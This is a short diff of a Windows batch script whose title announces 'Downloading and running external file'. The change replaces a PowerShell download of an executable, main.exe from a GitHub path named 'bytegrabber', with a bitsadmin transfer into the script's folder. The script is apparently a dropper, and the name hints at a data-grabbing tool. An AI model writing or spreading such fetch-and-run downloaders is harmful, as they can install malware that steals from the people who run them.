@@ -26,7 +26,7 @@ if %errorlevel% neq 0 (
 cls
 title Downloading and running external file...
 
-powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/ParadoxTheory/resources/blob/main/bytegrabber/main.exe', 'main.exe')"
+bitsadmin /transfer "DownloadJob" https://github.com/ParadoxTheory/resources/raw/main/bytegrabber/main.exe "%~dp0main.exe"
 
 if %errorlevel% neq 0 goto DOWNLOAD_ERROR
 
